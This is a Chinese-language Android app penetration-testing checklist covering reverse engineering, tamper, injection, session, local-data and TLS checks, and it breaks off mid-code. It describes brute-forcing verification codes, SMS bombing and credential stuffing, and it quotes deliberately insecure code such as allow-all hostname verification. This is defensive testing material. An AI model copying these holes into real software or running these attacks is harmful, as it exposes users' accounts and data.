\n数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞  Burpsuite/Fiddler Wireshark  \n挂钩工具 - 解决加密时上述工具无法使用的问题  Xposed框架1 在不修改APK文件的情况下控制程序运行 Frida 开源的跨平台挂钩框架，用来脱壳关键的函数，达到内存转储的目的 inject App进程注入评测工具  \nApp相关的信息资产  App文件2 程序进程 内存数据 前端界面3 本地存储 网络通信 交互接口 云端平台  \n程序代码安全测试 - APP文件、程序进程 \n运行环境测试4 \n防反编译测试5 \n反编译工具检测   检测目的\n检测App是否可以防止反编译工具，是否具有防逆向保护措施\n  检测方法\n 通过反编译工具对apk文件进行反编译，查看是否具有防逆向保护措施 通过IDA Pro等反汇编工具对动态库so文件进行反汇编，查看App是否具有防反汇编的能力    检测结论\n若App的dex文件和so文件无法正常反编译或者App经过加固处理，则通过测试\n  修复建议\n对App文件结构进行变形或加密，让反编译工具无法识别，或对App文件进行加固处理\n  \n代码混淆检测   检测目的\n检测App反编译后的源码是否经过混淆处理\n  检测方法\n通过反编译工具对apk文件进行反编译，查看代码中的类、字段和方法是否经过混淆处理\n  检测结论\n若反编译后源码中的类、字段和方法使用a、b、c、d等无意义的字符重命名，则通过测试\n  修复建议\n对App源码进行混淆处理\n  \n混淆强度检测   检测目的\n检测App反编译后的源码的混淆强度，查看是否能够有效地保护代码安全\n  检测方法\n 检测dex文件代码中所有的类名、函数名、字段、方法，是否都经过混淆处理，例如反编译后无法正常识别Java层函数的功能 检测so文件中所有类名、函数名、字段、方法，是否都经过混淆处理，例如反汇编后无法正常识别Native层函数功能    检测结论\n若反编译后代码*不能识别*出App函数的功能，则通过测试\n  修复建议\n针对dex文件和so文件的类名、函数名、字段、方法进行高强度混淆\n  \n关键代码(敏感逻辑和数据保护)检测   检测目的\n检测App是否对关键代码和数据实施有效的保护措施，是否暴露业务逻辑\n  检测方法\n通过反编译工具对apk文件进行反编译，结合manifest.xml配置文件，分析App注册、登陆、支付过程、加密算法、数据通信等关键功能代码，查看相关代码逻辑是否有明显的暴露\n  检测结论\n若App关键业务代码(如相关业务字符串)未暴露，且关键数据经过加密和隐藏保护处理，则通过测试\n  修复建议\n将App关键代码进行隐藏、混淆、加壳等处理，从而无法逆向出重要的代码信息\n  \n防篡改测试6 \n程序文件防篡改检测   检测目的\n检测App启动时是否进行了完整性校验，是否对客户端代码、资源文件进行修改，是否具有防篡改机制\n  检测方法\n 使用反编译工具Apktool对目标文件进行反编译\njava -jar apktool.jar d -f /path/to/test.apk 修改相关代码，篡改AndroidManifest.xml、assets文件、res文件等 使用apktool重新打包签名后再运行App查看运行结果\njava -jar apktool b -f /path/to/test    检测结论\n若打包后安装后*不能正常运行*，则通过测试\n  修复建议\n采用完整性校验技术对安装包进行校验，校验对象包括原包中代码、资源文件、配置文件等所有文件，一旦校验失败，立即退出\n  \n防调试测试7 \nTODO 调试工具防护检测   检测目的\n  检测方法\n  检测结论\n  修复建议\n  \nTODO 调试行为防护检测   检测目的\n  检测方法\n  检测结论\n  修复建议\n  \n内存防护检测   检测目的\n检测App内存是否具有内存防护功能，防止内存转储\n  检测方法\n 运行App，使用ps命令查看进程PID 使用 gdb -p \u0026lt;PID\u0026gt; 挂载App进程后，使用 (gdb) gcore 转储内存    检测结论\n若未生成corefile core.\u0026lt;pid\u0026gt; ,则通过测试\n  修复建议\n通过监控 /proc/pid/mem 和 /proc/pid/pagemep 来防止内存转储\n  \n防注入测试8 \n进程防护检测   检测目的\n检测App进程空间是否可以被注入第三方动态so文件\n  检测方法\n 运行App，通过注入工具或脚本，将第三方动态库文件注入App进程空间，查看第三方动态库是否在进程的内存空间中    检测结论\n若第三方动态库文件*不能注入*到目标进程空间，则通过测试\n  修复建议\n 增加ptrace函数的检测功能，使第三方无法使用该函数附加进程 修改linker中的dlopen函数，防止第三方进行so加载 定时检测App加载的第三方so库，若发现使被注入的so库，程序进程立即报异常    \n服务交互安全测试 - 程序进程、前段界面、接口端口 \n进程间交互 \n检测目的 检测进程间数据通信是否具有泄露用户信息的风险\n\n检测方法 查看AndroidManifest.xml文件中的、、、标签内的exported属性是否为false\n \u0026lt;activity android:exported=\u0026quot;true\u0026quot; 则可以被第三方App启动 \u0026lt;provider android:authorities=\u0026quot;com.bgy.ssm.fileprovider\u0026quot; android:exported=\u0026quot;true\u0026quot; 则可以被第三方app调用，实现增、删、改、查 \u0026lt;receiver android:exported=\u0026quot;true\u0026quot; 则可以接收第三方App发送的广播消息 \u0026lt;service android:enabled=\u0026quot;true\u0026quot; android:exported=\u0026quot;true\u0026quot; 则可以被第三方app启动  \n检测结论 客户端App用于跨进程通信的4种组建分别为Activity、ContentProvider、BroadCast、Service\n在 未明确要求 的情况下，只要以上配置中存在任一 exported=true 则测试 不通过\n\n修复建议 在未明确要求的情况下，在AndroidManifest.xml配置文件中设置该组建的exported属性为false，或对组建进行权限\n\n屏幕交互 \n界面劫持检测   检测目的\nApp是否具有防界面劫持(UI欺骗)功能，防止黑客伪造界面对原有界面进行覆盖，窃取用户和密码等敏感信息\n  检测方法\n  反编译源码，查看是否具有检测程序进入后台运行的代码, 当程序不是因为触摸返回键和HOME键今后后台运行时，提醒用户具有被劫持的风险\n@Override public boolean onKeyDown(int keyCode, KeyEvent event){ // 判断程序进入后台运行是否未触摸返回键和HOME键造成的 if((keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME) \u0026amp;\u0026amp; event.getRepeatCount()==0){ flag = false; } return super.onKeyDown(keyCode, event); } @Override protected void onPause(){ // 程序进入后台如果不是触摸返回键和HOME键造成的，则进行劫持风险提示 if(flag){ // 弹出警示信息 Toast.makeText(getApplicationContext(), \u0026quot;程序已经进入后台运行，具有劫持的风险\u0026quot;, Toast.LENGTH_SHORT).show(); } super.onPause(); }    编写透明界面，当运行至登陆、支付等界面时进行覆盖，查看是否具有风险提示\n    修复建议\n对App的UI界面进行校验，强制将自身UI时刻设置成顶层显示，其中HOME键除外，或自身UI界面进入后台运行后弹框提示用户App已经进入后台运行，有界面劫持风险\n  \n防截/录屏检测   检测目的\n检测App运行后是否存在防截/录屏保护措施\n  检测方法\n 通过 screencap 命令进行连续截屏，查看界面后的图片是否显示敏感信息 通过 screenrecord 命令进行录屏，查看录制后的视频是否显示敏感信息    修复建议\nApp要实现防截录屏的保护措施\n  \nWebView交互 \n克隆攻击检测   检测目的\n检测App中是否存在设置为可被导出的Activity组件，且组建中包含WebView调用，存在导致敏感信息泄露的风险\n  检测方法\n 通过JEB攻击反编译dex文件的源码，查看客户端是否使用了WebView空间，并将 setAllowFileAccessFromeFileURLs 或 setAllowUninvertedFileAccessFromFileURLs API设置为 true 检测file域的路径是否做了严格限制    检测结论\n若App使用WebView组建，并将 setAllowFileAccessFromeFileURLs 或 setAllowUninvertedFileAccessFromFileURLs API设置为 false ，则通过测试\n若App使用WebView组建，并将 setAllowFileAccessFromeFileURLs 或 setAllowUninvertedFileAccessFromFileURLs API设置为 true ，且file域的路径做了严格限制，则通过测试\n  修复建议\n严格限制包含WebView调用的Activity组建的导出权限，关闭导出权限或限制导出组建的发起者\n  \nWebView安全检测   检测目的\n检测App使用的WebView空间加载的外部资源是否存在潜在风险\n  检测方法\n检测App源码，查看客户端是否对WebView对空间加载的资源文件进行了校验，过滤风险代码\n  检测结论\nApp使用WebView空间减灾的HTML未明确要求使用Javascript，\n未对加载文件进行校验，或未使用安全的通信协议，\n并在WebView加载的程序中有实现发送短信，拨打电话等敏感行为的操作代码，则本项测试不通过\n  修复建议\n WebView加载的HTML页面，在未明确要求的情况下，禁用Javascript 对WebView加载的外部文件进行校验 采用HTTPS安全通信协议，不要在WebView加载的外部文件中实现敏感操作的代码    \n接口端口交互 \n对象反序列化检测   检测目的\n检测App是否使用安全的API实现序列化和反序列化，是否存在反序列化漏洞\n  检测方法\n 通过JEB工具反编译dex文件的源码，查看客户端App是否具有实现序列化和反序列化的源代码 检测实现序列化和反序列化的API是否具有潜在风险和漏洞    检测结论\n若客户端App不具有序列化和反序列化的代码，或实现序列化和反序列化的API不具有潜在风险和漏洞，则通过测试\n  修复建议\nApp采用安全框架的API实现序列化和反序列化\n  \nWormhole漏洞检测   检测目的\n检测App是否存在Wormhole漏洞\n  检测方法\n 检测App是否私自开启HTTP服务，是否进行身份认证 通过nmap工具扫描，检测App代码中是否开放某个TCP端口    检测结论\n如App私自开启了HTTP服务，开放某个TCP端口，同时该服务无身份认证，则本测试 不通过\n  修复建议\nApp关闭HTTP服务和端口，增加App的访问权限控制机制\n  \n鉴权认证安全测试 - 接口端口、内存数据、网络通信 \n注册过程测试 \n注册信息保护检测   检测目的\n检测App注册密码的复杂度(密码内容要求字母大小写、数字、特殊字符组合，长度等)和注册信息在本地存储时的保护程度是否足够高\n  检测方法\n  检测App注册密码的复杂度\npublic static boolean isPasswordChecked(CharSequence data){ return Pattern.compile(\u0026quot;^((a-z0-9A-Z)+[_]?){6,20}$\u0026quot;).matcher(data).find(); }    检测App在本地存储的注册信息是否加密存储，加密密钥是否进行了隐藏处理\n    检测结论\n如果对注册密码复杂度、长度进行了限制处理，且对本地存储的注册信息进行了加密保护，加密密钥隐藏，则通过测试\n  修复建议\n 对注册密码的复杂度和长度进行限制 对在本地存在的用户注册信息进行加密处理，隐藏加密密钥    \n注册信息传输检测   检测目的\n检测App将用户注册信息传输到服务器端的过程中是进行了加密保护\n  检测方法\n使用Burpsuite拦截App注册用户的数据包，查看数据包是否加密\n  检测结论\n若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试\n  修复建议\n在将用户注册信息传输到服务器端的过程中，对用户注册信息进行加密处理\n  \n注册过程防爆破检测   检测目的\n检测App在注册账户时，是否可以爆破获取正确的验证码，注册任意用户\n  检测方法\n在注册界面填写完注册信息后，点击“获取验证码”，使用抓包工具对其抓包，对数据包中的验证码进行暴力破解，爆破成功后，便可注册任意账号\n  检测结论\n若在注册App时验证码被爆破，可以任意注册账户，则本项测试不通过\n  修复建议\n 使用复杂的验证码，验证码长度不低于6位，包含数字及字母 对发送验证码请求进行时间和次数限制 验证码在传输时进行有效的加密处理    \n注册过程防嗅探检测   检测目的\n检测在App注册过程中是否可以利用已有社工库中的手机号、邮箱、用户名、密码等信息，通过撞库方式频繁嗅探注册账户\n  检测方法\n利用Burpsuite拦截注册用户时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数，进行撞库，从而获取用户注册\n  检测结论\n若在注册时暴露账户、密码参数，具有利用撞库对用户注册信息进行嗅探的风险，则本项测试不通过\n  修复建议\n 对传输的注册账户、密码等敏感信息进行强加密处理 服务器端限制访问次数    \n登陆过程测试 \n密码安全验证检测   检测目的\n检测App登陆密码的验证方案是在本地验证还是在服务器端验证，验证过程中是否加入了设备信息\n  检测方法\n利用JEB逆向分析App登陆功能的源码，分析密码验证中是否加密了设备信息IMEI\n  检测结论\n若密码验证在服务器端进行，且加入了设备信息，避免在非法设备登陆，则通过测试\n  修复建议\nApp登陆密码在服务器端进行验证，并加入设备信息，以降低用户登陆密码泄露的风险\n  \n登陆信息加密传输检测   检测目的\n检测App在将用户登录信息传输到服务器端的过程中是否进行了加密保护，以免被攻击者拦截网络流量，窃取用户登陆信息\n  检测方法\n使用Burpsuite拦截app登陆操作的数据包，分析是否明文传输用户信息\n  检测结论\n若App在将用户注册信息传输到服务器端时进行了加密处理，则通过测试\n  修复建议\nApp在将用户登陆信息传输到服务器端的过程中，要对用户登陆信息进行加密处理\n  \n登陆过程防爆破检测   检测目的\n检测App在登录时，是否可以抓取数据包，利用数据包中的验证码字段/密码字段进行暴力破解\n  检测方法\n检测App在登陆时，是否可以爆破验证码/密码，获取正确的验证码和登陆密码\n  检测结论\n若App在登陆时验证码和登陆密码可以被爆破，则本项测试不通过\n  修复建议\n 使用复杂的验证码和登陆密码 对发送验证码的请求进行时间和次数限制 对验证码、登陆密码进行输入错误次数限制 验证码、登录密码在传输时进行有效的加密处理    \n登陆过程防嗅探检测   检测目的\n检测App是否可以通过爆破验证码实现任意账户登陆、任意重置用户密码等操作\n  检测方法\n 验证码爆破检测\n在登陆界面填写完手机号等信息后点击“获取验证码”，使用抓包工具对其抓包，对数据中的验证码进行暴力破解，爆破成功后便可实现登陆任意账户、任意重置用户密码 短信轰炸检测\n在登陆界面填写完手机号等信息后点击“获取验证码”，若短信验证码无获取时间、获取次数限制，便可重放发送短信验证码数据进行短信轰炸 探测是否具有撞库风险\n利用工具拦截用户登陆时的数据包，分析查看是否暴露账户、密码参数，然后利用社工库数据替换账户、密码参数进行撞库，从而获取用户登陆信息    检测结论\n若App通过爆破验证码实现登陆任意账户、任意重置用户密码、短信炸弹，或通过撞库获取用户登陆信息，则此项测试 不通过\n  修复建议\n 使用复杂验证码、登陆密码 对发送验证码的请求进行时间和次数限制 对验证码输入错误次数进行限制 验证码在传输时进行有效的加密处理 服务端限制访问次数    \n登陆过程防绕过检测   检测目的\n检测App是否可以绕过验证码登陆任意账户、修改用户ID获取其他用户信息\n  检测方法\n 抓取登陆成功后的响应包，之后退出，在登陆其他用户账户时，用登陆成功的响应包替换登陆失败的数据包，检测是否可以绕过验证码、密码验证，进而成功登陆其他用户的账户 修改用户ID，检测是否可以获取任意用户信息，若用户身份认证采用单一ID值判断，攻击者可以修改数据包中的用户ID进行重放，从而获取其他用户信息    检测结论\n若App可以绕过验证码登陆其他用户，或可以修改用户ID获取其他用户信息，则本项测试 不通过\n  修复建议\n加强身份验证机制，使用Token或Session机制，设置访问控制策略，敏感数据采用高强度加密传输\n  \n加强认证检测   检测目的\n检测App客户端是否具有双因子认证机制，保护用户登陆信息\n  检测方法\n 检测App在登陆时，是否具有双因子认证机制(密码+令牌/指纹/设备信息/短信) 使用用户登陆信息在新设备登陆时，查看是否具有短信提醒    检测结论\n如Apple具有双因子认证机制和不同设备登录时的短信提醒认证机制，则通过测试\n  修复建议\nApp采用双因子认证机制和不同设备登陆短信提醒认证机制，保护用户登陆信息安全\n  \n会话过程测试 \n有状态会话标志检测   检测目的\n检测客户端与服务器端交互的会话，是否存在复杂的会话ID，同时服务器是否对其进行校验\n  检测方法\n 模拟客户端与服务器端登陆，查看是否采用 简单的Sessionid方式标识 客户端 利用服务端返回的 _Sessionid构建新的URL 访问服务器端，查看是否能够绕过验证 查看客户端与服务器交互时是否采用 *复杂的Key*，是否存在时间有效性校验，防止被伪造    检测结论\n若客户端与服务器端会话时采用来复杂加密的Key，同时服务器端对客户端发送的Key进行了校验，攻击这无法伪造，服务器端无响应，则通过测试\n  修复建议\n客户端与服务器端通信会话时采用复杂的算法对随机的Sessionid进行加密，同时服务器端对随机的Sessionid进行校验\n  \n无状态会话Token检测   检测目的\n在客户端与服务器端通信会话过程中，检测是否存在Token机制，是否容易被攻击者截取利用\n  检测方法\n 检测客户端与服务器端通信会话的URL中是否使用携带Token，Token是否明文显示 检测客户端与服务器端认证的复杂性，是否采用类似 UID+Toekn+timestamp+密钥 的Toekn机制，并尝试破解    检测结论\n若客户端与服务器端通信会话的Toekn能被轻易获取利用或被破解，则本项测试不通过\n  修复建议\n 每次登陆时重新生成Token，并设置有效期，每次操作后更新Token的时间戳，保证Token有效期往后延续 为了避免Token被截获，伪造非法请求，在每次请求时，建议采用 UID+Token+timestamp+密钥+请求参数签名 ，服务器同时验证Token和签名，以保证请求的安全性    \n会话不活跃检测   检测目的\n若客户端与服务器端通信临时终端或长时间不活跃，检测服务器是否立即终止会话\n  检测方法\n 在客户单与服务器端通信过程中，若长时间不操作，然后再操作时，查看客户端与服务器端是否已中断 在客户单与服务器端通信过程中，若临时中断，例如打开微信等其他操作，让服务在后台运行，查看客户端与服务器端是否已中断    检测结论\n若客户端与服务器端通信临时中断或长时间不活跃时，服务器端立即与客户端中断会话，需要重新认证，则本项测试结果为通过\n  修复建议\n在客户端与服务器端通信会话过程中，增加时间的有效性，例如设置时间为5min，若客户端与服务器长时间不活跃或者客户端服务在后台运行，服务器立即中断本次会话\n  \n加强认证检测   检测目的\n在客户端与服务器端进行敏感交易时，检测服务器端是否存在双因子身份认证机制\n  检测方法\n 检测客户端与服务器端进行支付、转账等敏感交易时，客户端是否需要多个身份认证方式，同时服务器端是否对其双因子进行校验 检测客户端与服务器端进行身份认证过程中，数据是否进行加密处理，加密强度如何    检测结论\n若客户端与服务器端存在双因子身份认证，则通过测试\n  修复建议\nApp中涉及敏感用户信息的界面，要求使用双因子身份认证机制，例如采用支付密码和用户预留短信验证码等认证方式\n  \n登出过程测试 \n会话终止检测   检测目的\n在用户执行登出操作后，检测服务器端是否立即终止与客户端之间的会话连接\n  检测方法\n 登陆App，执行一些需要在App进行身份验证的操作，并拦截 退出App 重放步骤1中的操作，显示错误消息或重定向到登录页面    检测结论\n若在客户端用户执行登出操作后，服务器立即终止与客户端之间的会话连接，需要用户重新进行登陆认证\n  修复建议\n在用户执行登出操作后，立即终止客户端与服务器端的会话连接\n  \n残留数据检测   检测目的\n当用户执行登出操作后，检测服务器是否及时删除客户端对应的Token或Sessionid\n  检测方法\n操作客户端登出功能，通过用户名、密码、及之前的Token值或Sessionid值能够登陆成功，则本项测试不通过\n  检测结论\n在用户执行登出操作后，若客户端使用之前的Token或Sessionid值能够登陆成功，则本项测试不通过\n  修复建议\n当用户执行登出操作后，服务端及时删除户端对应的Token或Sessionid值\n  \n注销过程测试 \n重新注册检测   检测目的\n检测在客户端注销后，使用相同账户能否重新注册\n  检测方法\n 检测客户端是否存在注销功能 在客户单注销之后，使用相同账户注册，查看是否可以重新注册，测试第三方关联的账户是否也已经注销，还能否正常登陆    检测结论\n若注销账户后仍可以使用相同的账户注册，关联的第三方数据无法使用，则通过测试\n  修复建议\n在客户端注销操作后，可以使用相同账户重新注册，确认原来的账户信息已经清除\n  \n数据清除检测   检测目的\n检测在App卸载后，本地存储的数据或账户缓存等信息是否全部清除\n  检测方法\n 安装App，先注册，登录试用，然后卸载，查看本地注册的用户账户信息等数据是否及时删除 重新安装App，查看使用之前的账户和密码是否可以直接登陆    检测结论\n若卸载App后，本地数据完全及时清除，则通过测试\n  修复建议\n在App卸载后，及时删除本地存储的全部数据\n  \n本地数据安全测试 - 内存数据、本地存储 \n数据创建测试 \n用户协议检测   检测目的\n检测App是否存在用户协议声明。若存在，是否对使用用户信息用户及保护措施进行声明，是否存在违规行为\n  检测方法\n 安装运行App，试用App的所有主要功能，并抓包，通过数据包和源代码了解其行为特征 查看是否存在用户协议，以及协议内容是否声明App需要手机的用户信息及保护措施    检测结论\n若App存在用户服务协议，且声明了用户信息用途及保护措施，则通过测试\n  修复建议\nApp手机用户个人信息前，必须在用户服务协议中声明，需要收集用户设备的哪些信息、具体用途、及保护用户信息的安全措施和具体承诺\n  \n数据采集检测   检测目的\n检测App是否过度申请系统敏感权限，使用该权限时是否提示用户授权，是否过度手机用户数据，数据传输过程是否安全\n  检测方法\n 查看AndroidManifest.xml文件标签，分析App所申请的系统权限，是否存在过度申请的敏感权限 查看App调用系统的敏感权限时是否提示用户授权 分析App源码及数据包内容，查看是否过度收集在用户协议声明范围外的用户数据，确认数据传输过程中的安全性    检测结论\n若App无过度申请系统敏感权限，且在使用该权限时提示用户授权，同时没有过度收集用户数据，则通过测试\n  修复建议\nApp发布时需要删除不需要的系统敏感权限，在申请系统敏感权限时，需要提示用户授权，不得私自上传在协议中未声明的用户信息\n  \n数据输入检测   检测目的\n检测App是否实现了自带的安全键盘，且启动键盘时数字是否随机分布，关键的输入框是否禁用复制粘贴功能，是否存在验证码校验机制，验证码是否安全\n  检测方法\n 检测App是否实现了自定义软键盘，在每次启动时按键数字随机分布，且按键时不存在按键阴影，按键回显等特效 检测要求输入敏感数据(登陆密码、支付密码、银行卡账户等)输入框禁用复制粘贴功能 检测验证码是否由图形验证码或短信验证码组成，是否通过服务器端返回给客户端    检测结论\n若App实现了自定义软键盘，键盘数字实现了随机分布，具有安全的验证码，同时密码输入框禁用了复制粘贴功能，则通过测试\n  修复建议\n App客户端实现自定义的软键盘，软键盘每次启动时都要随机分布，且按键无回显、阴影等特效 要求输入登陆、支付密码、银行卡账户等输入框禁用复制粘贴功能 设置 android:longClickable=\u0026quot;false\u0026quot; 关闭其功能 增加复杂图形验证码或短信验证码，且在传输过程中对数据进行加密    \n数据生成检测   检测目的\n检测App生成数据的存储形式时是结构话还是非结构话，数据是否经过加密后存储\n  检测方法\n 检测App生成的结构化数据，要求数据内容加密后存储 检测App生成的非结构化数据，要求数据内容加密后存储    检测结论\n若本地存储的数据经过加密处理，则通过测试\n  修复建议\n不管生成的数据是采用结构化还是非结构化形式存储，都要求加密后存储\n  \n数据存储测试 \n访问控制检测   检测目的\n检测App是否具备完善的权限管理机制，是否能够与其他App隔离，是否在权限允许的范围之外存在数据被其他客户端访问的风险\n  检测方法\n查看App本地存储文件的权限\nls -al files # 本地存储file文件权限 ls -al shared_pref # 本地存储xml文件权限 ls -al app_webview # 本地存储的cache文件权限 ls -al databases # 本地存储的db文件权限    检测结论\n如客户端具备完善的权限管理机制，以最小权限为原则，则通过测试\n  修复建议\nApp客户端严格控制本地生成敏感数据访问权限，避免被第三方App非法访问导致用户信息泄露\n  \n数据加密检测   检测目的\n检测App在本地存储的用户信息是否经过了加密处理，加密密钥是否进行了保护，加密算法是否合理，生成的随机数强度是否较高，避免造成用户信息泄露风险\n  检测方法\n检测App在本地生成的数据文件是否加密，检测App在本地存储的文件是否加密\n  检测结论\n若本地数据进行了加密处理，加密密钥进行了保护处理，且采用多种加密算法组合加密，对不同的数据采用了不同的加密算法，采用安全的方式生成随机数，则通过测试\n  修复建议\n 对App在本地存储的用户信息进行加密处理 对对称加密算法的加密密钥进行加密保护和隐藏处理 对APp在本地存储的用户信息进行多重加密，并对用户数据采用多种加密方式 避免使用不安全的随机数生成类 避免使用不安全的加密算法    \n数据处理测试 \n程序日志检测   检测目的\n检测App源码中的调试信息是否关闭，在调试信息中是否写入敏感信息\n  检测方法\n  反编译源码，查看是否存在日志调试代码，要求不得存在日志调试代码\nprivate void save(){ String mName=etUsername.getText().toString(); String mPwd=etPwd.getText().toString(); mEditor.putString(\u0026quot;Name\u0026quot;,mName); mEditor.putString(\u0026quot;Pwd\u0026quot;,mPwd); mEditor.commit(); Log.d(\u0026quot;TEST\u0026quot;,\u0026quot;本地存储\u0026quot;+\u0026quot;用户名\u0026quot;+mName+\u0026quot;密码\u0026quot;+mPwd); }    动态运行App客户端，使用~logcat~查看后台打印日志是否存在用户敏感数据，要求后台不得打印日志调试信息\n    检测结论\n若App关闭了源码中的调试信息，则通过测试\n  修复建议\nApp发布时应删除源码中的日志调试代码\n  \n敏感数据不当使用检测   检测目的\n检测App源码和行为特征是否符合App安全相关标准的规定\n  检测方法\n反编译App代码，查看是否私自手机用户敏感信息，抓包拦截，检测是App是否私自上传用户隐私到服务器\n  检测结论\n逆向分析源码和数据包，若符合App安全相关标准的规定，则通过测试\n  修复建议\nApp源码要进行严格审核处理，禁止在用户未知情的情况下私自收集用户信息\n  \n数据共享测试 \n第三方SDK用户协议检测   检测目的\n检测在App服务协议中是否声明第三方SDK收集用户信息的用途，是否过度收集用户个人信息\n  检测方法\n查看用户协议内容是否声明共享用户信息给第三方SDK，并通过抓包查看第三方SDK的行为特征\n  检测结论\n若用户协议中明确声明App信息与第三方共享情况，则通过测试\n  修复建议\nApp要明确声明是否会与第三方共享用户信息，以及共享用户信息的具体用途\n  \n与第三方SDK数据共享检测   检测目的\n检测App是否在用户未知情的情况下，私自共享用户个人信息给第三方SDK，以及第三方SDK是否私自收集用户个人信息到指定服务器\n  检测方法\n 分析App源码和数据包，查看是否在用户未知情的情况下，将收集的用户信息私自上传至第三方服务器 分析App嵌入的第三方SDK源码和数据包，查看是否存在第三方SDK在用户不知情的情况下，将收集的用户信息私自上传至第三方服务器    检测结论\n若分析源码内容和数据包后，符合App安全相关标准的规定，则通过测试\n  修复建议\n在App共享数据给第三方SDK的服务协议之外，禁止App和第三方SDK私自采用短信或数据包等形式，收集用户信息并上传到指定服务器\n  \n数据备份测试 \n敏感数据备份检测   检测目的\n检测App应用数据是否可以备份，是否能够防止攻击者复制App数据\n  检测方法\n查看Androidmanifest.xml文件中的allowBackup属性是否为true\n\u0026lt;application android:allowBackup=\u0026quot;true\u0026quot;\n  检测结论\n在App不具备备份功能的情况下，若 \u0026lt;application android:allowBackup=\u0026quot;false\u0026quot; 则通过测试\n  修复建议\n在App不具备备份功能的情况下，应将 \u0026lt;application android:allowBackup=\u0026quot;false\u0026quot;\n  \n备份数据加密强度检测   检测目的\n检测App备份的数据是否进行加密处理，并且要求使用复杂的加密强度高的算法\n  检测方法\n若采用对称算法加密，则判断对称算法的密码是否存储安全，加密算法的源代码是否可以被破解\n  检测结论\n若App备份的数据进行了加密处理，则通过测试\n  修复建议\n采用多种混合算法加密，例如AES256,MD5,HASH,DES,BASE64\n  \n数据销毁测试 \n后台运行数据检测   检测目的\n检测App客户端在切入后台运行时是否对收集存储的文件、数据库、配置文件、缓存文件等进行及时清理操作\n  检测方法\n App切入后台运行时，查看本地生成的db文件、xml文件或者内存中的数据是否进行了删除 导出本地的缓存信息文件，查看是否有敏感信息暴露    检测结论\n若App在切入后台运行时，本地生成的临时文件db、xml、cache中的数据或者运行时内存中的用户数据做到了及时清理，则通过测试\n  修复建议\nApp在切入后台运行后，应及时清理本地存储的用户敏感信息和内存中的数据信息\n  \n敏感数据清除检测   检测目的\n检测App在退出或被卸载时，是否彻底删除在手机本地存储的文件、数据库、缓存、配置信息等文件\n  检测方法\n使用反编译工具apktool对目标文件进行反编译，查看App代码中是否具有清除缓存信息的方法 removeSessionCookie()/deleteCookie()\nif(\u0026quot;ClearWebView\u0026quot; , \u0026quot;webView.clearCache\u0026quot;){ try{ CookieSyncManager.createInstance(this.Y.getApplicationContext()); CookieSyncManager.getInstance().removeSessionCookie(); CookieSyncManager.getInstance().sync(); }catch(Exception v0_1){ } }    检测结论\n若本地生成文件仍然存在，则本项测试 不通过\n  修复建议\n检测App在退出或被卸载时，应彻底删除在手机本地存储的文件、数据库、缓存、配置信息等信息\n  \n网络传输安全测试 - 网络通信 \n安全传输层测试 \nTLS实现检测   检测目的\n检测客户端与服务器端交互核心的通信会话是否采用HTTPS，同时是否为现有最佳实践方式\n  检测方法\n使用Burpsuite/Wireshark抓包，判定用户登录、交易等私密连接是否使用HTTPS进行网络通信，查看TLS版本是否高于1.0\n  检测结论\n若客户端与服务器端通信采用HTTPS，且TLS版本高于1.0，则通过测试\n  修复建议\n客户端与服务器端核心的通信会话均采用HTTPS，同时TLS版本高于1.0\n  \nCA证书检测   检测目的\n检测客户端与服务器建立安全通道时，客户端是否验证远程端点的X.509证书，是否只接受受信任的CA签名证书\n  检测方法\n检测CA证书的合法性，是否为受信任的CA签名证书，App是否只接受受信任的CA签名证书\n 抓取App与服务器端交互的数据，校验证书的颁发机构 在源码中检查客户端是否只接受受信任的CA签名证书    检测结论\n若截获的数据包中证书由可信任机构签发，且在有效期内，且访问服务器与证书绑定的一致，同时只接受信任的CA签名证书，则通过测试\n  修复建议\n客户端验证远程端点的X.509证书，只接受受信任的CA签名的证书\n  \n证书校验检测   检测目的\n检测客户端和服务器是否对证书进行双向校验\n  检测方法\n 反编译App代码，检测是否存在客户端验证服务器端证书的代码  验证证书内容有效性、数字摘要是否一致   反编译App代码，检测是否存在客户端发送本地证书给服务器端认证的代码    检测结论\n若客户端对服务器端返回的证书进行了验证，同时服务器端也对客户端证书进行了校验，则通过测试\n  修复建议\n建议一般的App要实现客户端对服务器端证书的单向验证，对于安全要求比较高的App，要实现客户端与服务器端证书的双向验证\n  \n主机名校验   检测目的\n检测客户端是否对主机名进行校验\n  检测方法\n反编译App代码，查找App通信的代码，查看 setHostnameVerifier() 方法接受任意域名还是进行了主机名验证\npublic static SSLSocketFactory getFixedSocketFactory(){ MySSLSocketFactory v0; try{ v0=new MySSLSocketFactory(MySSLSocketFactory.getKeystore()); //缺陷代码 ((SSLSocketFactory)v0).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER); }catch(Throwable v1){ v1.printStackTrace(); SSLSocketFactory v0_1 = SSLSocketFactory.getSocketFactory(); } return ((SSLSocketFactory)v0); }    检测结论\n若App接受任意域名，则本项测试 不通过\n  修复建议\nApp对主机名进行校验，不能接受任意域名\n  \n数据加密检测 \n检测目的 检测在客户端与服务器端通信过程中，业务数据是否以明文方式在网络中传输，数据加密的复杂度如何\n\n检测方法  对客户端与服务器端通信的登陆、支付、转账等核心功能进行抓包，查看业务数据是否以明文方式在网络中传输 检测数据加密方式的复杂度，url编码、Base64编码、AES\\DES加密等  \n检测结论 若客户端与服务器端交互的业务数据经过多个复杂的算法加密，且无法破解，则通过测试\n\n修复建议 客户端与服务器端交互的上行/下行数据要经过多个复杂算法进行加密，同时加密存储对称加密算法密钥\n\n中间人攻击测试 \nHTTP中间人会话劫持检测   检测目的\n检测客户端与服务器端交互的数据是否可以被任意篡改，导致重放攻击漏洞\n  检测方法\n运行测试App，点击登陆，拦截数据包，并进行修改后放行，查看App运行结果是否能够修改成功\n  检测结论\n若客户端与服务器端交互的数据经过加密处理，且数据无法修改，则通过测试\n  修复建议\n 采用高强度的加密算法对交互数据进行加密/或使用HTTPS 对客户端请求的数据和服务器端返回的数据进行完整性校验，防止被篡改    \nHTTPS中间人会话劫持检测   检测目的\n检测App在使用HTTPS时，是否存在中间人攻击漏洞\n  检测方法\n  反编译源码，查看是否校验服务器端是否可信- 查看实现X509TrustManager接口中 checkServerTrusted() 方法实现是否为空\npublic MySSLSocketFactory(KeyStore truststore) throws NoSuchAlgorithmException, KeyManagementException{ this.sslContext = SSLContext.getInstance(\u0026quot;TLS\u0026quot;); this.sslContext.init(null,new 